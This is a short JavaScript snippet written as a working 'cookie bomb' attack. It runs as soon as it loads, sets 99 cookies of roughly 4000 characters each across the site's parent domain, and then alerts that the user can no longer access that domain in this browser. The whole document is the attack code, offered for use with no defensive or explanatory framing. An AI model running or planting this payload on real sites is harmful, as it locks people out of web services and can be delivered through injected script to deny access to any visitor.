function cookieBomb() {
    // Get the current domain and its parent domain
    const domain = document.domain.split('.').splice(-2).join('.');
    
    // Create a large string to fill the cookies
    const pollution = 'a'.repeat(4000); // 4000 characters
    
    // Create multiple cookies to flood the browser
    for (let i = 1; i < 100; i++) {
        document.cookie = `bomb${i}=${pollution}; domain=${domain}; path=/`;
    }
    
    // Notify the user when the bomb is complete
    setTimeout(() => {
        alert(`Cookie bomb complete! You can no longer access ${domain} in this browser.`);
    }, 1000);
}

// Call the function to execute the cookie bomb
cookieBomb();
